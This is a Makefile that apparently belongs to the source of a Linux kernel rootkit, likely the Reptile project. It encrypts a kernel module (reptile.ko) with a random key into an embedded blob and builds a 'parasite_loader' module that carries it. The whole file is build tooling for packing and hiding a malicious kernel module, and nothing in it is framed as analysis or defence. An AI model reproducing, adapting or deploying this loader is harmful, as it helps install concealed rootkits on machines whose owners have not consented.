PARASITE ?= ../reptile.ko

all: encode
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD
	cp parasite_loader.ko ../bin/reptile

encode:
	RAND := $(shell openssl rand -hex 4 > /dev/null 2>&1 && openssl rand -hex 4 || cat /dev/urandom | head -c 4 | hexdump '-e"%x"')
	$(MAKE) -C encrypt
	encrypt/encrypt $(PARASITE) \
		0x$(RAND) > parasite_blob.inc

clean:
	$(MAKE) -C encrypt clean
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD clean
	rm -f parasite_blob.inc
